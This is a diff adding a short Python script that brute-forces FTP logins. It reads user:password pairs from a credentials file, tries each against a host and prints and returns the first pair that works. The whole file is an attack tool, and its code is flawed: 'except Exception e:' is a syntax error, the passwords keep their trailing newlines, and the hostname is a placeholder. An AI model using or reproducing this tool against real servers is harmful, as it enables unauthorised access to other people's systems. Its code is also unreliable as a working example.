@@ -1,0 +1,22 @@
+import ftplib
+
+def bruteForceLogin(hostname, passwordFile):
+    passList = open(passwordFile, 'r')
+    for line in passList.readlines():
+        userName = line.split(':')[0]
+        passWord = line.split(':')[1]
+        print("[+] Trying: " + str(userName) + "/" + str(passWord))
+        try:
+            ftp = ftplib.FTP(hostname)
+            ftp.login(userName, passWord)
+            print("FTP Login succeded: " + str(userName) + "/" + str(passWord))
+            ftp.quit()
+            return(userName, passWord)
+        except Exception e:
+            pass
+
+
+if __name__ == '__main__':
+    hostname = "123"
+    passwordFile = 'credentials.txt'
+    bruteForceLogin(hostname, passwordFile)
